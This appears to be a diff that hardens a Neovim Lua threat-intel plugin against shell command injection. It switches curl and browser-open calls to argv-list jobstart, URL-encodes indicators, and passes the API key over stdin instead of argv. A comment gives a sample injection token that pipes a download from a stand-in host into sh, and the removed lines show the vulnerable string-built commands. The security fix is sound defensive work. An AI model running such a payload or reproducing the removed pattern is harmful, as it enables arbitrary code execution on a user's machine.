@@ -16,6 +16,59 @@ M.config = {
   api_url = "https://analytics.dugganusa.com/api/v1",
 }
 
+
+-- ============================================================================
+-- SHELL SAFETY (2026-07-19)
+--
+-- Every request used to be built as a STRING and handed to vim.fn.jobstart().
+-- String form executes via `sh -c`, so any shell metacharacter in the indicator
+-- was interpreted. M.lookup() even built a shellescape()'d `url` on one line and
+-- then discarded it, re-interpolating the raw value on the next.
+--
+-- The input is vim.fn.expand("<cword>") — the word under the cursor — or a
+-- visual selection. This plugin exists to inspect suspicious indicators inside
+-- suspicious files, so the attacker controls it exactly when it matters most.
+-- A token like:  foo'; curl evil.example/x | sh; echo '
+-- executed arbitrary commands as the developer.
+--
+-- jobstart() with a LIST goes straight to execvp with no shell, so metacharacters
+-- can never be interpreted. That removes the whole class rather than escaping it.
+--
+-- The API key also moved out of argv: it was passed as -H on the command line and
+-- therefore readable by any local user via `ps aux`. curl now reads the header
+-- from stdin via `--config -`.
+-- ============================================================================
+
+local function url_encode(v)
+  return (tostring(v or ""):gsub("[^%w%-%._~]", function(c)
+    return string.format("%%%02X", string.byte(c))
+  end))
+end
+
+-- Returns argv (list form — never a string) plus the stdin config carrying the key.
+local function curl_argv(path)
+  local argv = { "curl", "-s", "--max-time", "20" }
+  local stdin_cfg = nil
+  if M.config.api_key ~= nil and M.config.api_key ~= "" then
+    table.insert(argv, "--config")
+    table.insert(argv, "-")
+    stdin_cfg = 'header = "Authorization: Bearer ' .. M.config.api_key .. '"\n'
+  end
+  table.insert(argv, M.config.api_url .. path)
+  return argv, stdin_cfg
+end
+
+-- jobstart with argv, feeding the key over stdin so it never reaches the process table.
+local function curl_start(path, opts)
+  local argv, stdin_cfg = curl_argv(path)
+  local job = vim.fn.jobstart(argv, opts)
+  if job > 0 and stdin_cfg then
+    vim.fn.chansend(job, stdin_cfg)
+    vim.fn.chanclose(job, "stdin")
+  end
+  return job
+end
+
 function M.setup(opts)
   M.config = vim.tbl_extend("force", M.config, opts or {})
 
@@ -28,7 +81,15 @@ function M.setup(opts)
     vim.ui.input({ prompt = "Domain to audit: " }, function(domain)
       if domain and domain ~= "" then
         local clean = domain:lower():gsub("^https?://", ""):gsub("/.*$", ""):gsub("^www%.", "")
-        vim.fn.system("open 'https://aipmsec.com/audit.html?domain=" .. clean .. "' 2>/dev/null || xdg-open 'https://aipmsec.com/audit.html?domain=" .. clean .. "' 2>/dev/null &")
+        -- argv form, no shell. `clean` is sanitised but was still interpolated
+        -- into a shell string; a domain containing a quote escaped it.
+        local aipm_url = "https://aipmsec.com/audit.html?domain=" .. url_encode(clean)
+        if vim.ui.open then
+          vim.ui.open(aipm_url)
+        else
+          local opener = vim.fn.has("mac") == 1 and "open" or "xdg-open"
+          vim.fn.jobstart({ opener, aipm_url }, { detach = true })
+        end
         vim.notify("AIPM audit opened for " .. clean, vim.log.levels.INFO)
       end
     end)
@@ -66,14 +127,7 @@ function M.lookup(value)
 
   vim.notify("DugganUSA: checking " .. value .. "...", vim.log.levels.INFO)
 
-  local url = M.config.api_url .. "/search/correlate?q=" .. vim.fn.shellescape(value)
-  local cmd = "curl -s"
-  if M.config.api_key ~= "" then
-    cmd = cmd .. " -H 'Authorization: Bearer " .. M.config.api_key .. "'"
-  end
-  cmd = cmd .. " '" .. M.config.api_url .. "/search/correlate?q=" .. value .. "'"
-
-  vim.fn.jobstart(cmd, {
+  curl_start("/search/correlate?q=" .. url_encode(value), {
     stdout_buffered = true,
     on_stdout = function(_, data)
       local raw = table.concat(data, "")
@@ -126,13 +180,7 @@ function M.tor_check(ip)
 
   vim.notify("DugganUSA: checking Tor relay " .. ip .. "...", vim.log.levels.INFO)
 
-  local cmd = "curl -s"
-  if M.config.api_key ~= "" then
-    cmd = cmd .. " -H 'Authorization: Bearer " .. M.config.api_key .. "'"
-  end
-  cmd = cmd .. " '" .. M.config.api_url .. "/tor/relays?q=" .. ip .. "&limit=1'"
-
-  vim.fn.jobstart(cmd, {
+  curl_start("/tor/relays?q=" .. url_encode(ip) .. "&limit=1", {
     stdout_buffered = true,
     on_stdout = function(_, data)
       local raw = table.concat(data, "")
@@ -161,13 +209,7 @@ end
 function M.tor_hunt()
   vim.notify("DugganUSA: hunting suspicious Tor relays...", vim.log.levels.INFO)
 
-  local cmd = "curl -s"
-  if M.config.api_key ~= "" then
-    cmd = cmd .. " -H 'Authorization: Bearer " .. M.config.api_key .. "'"
-  end
-  cmd = cmd .. " '" .. M.config.api_url .. "/tor/hunt'"
-
-  vim.fn.jobstart(cmd, {
+  curl_start("/tor/hunt", {
     stdout_buffered = true,
     on_stdout = function(_, data)
       local raw = table.concat(data, "")
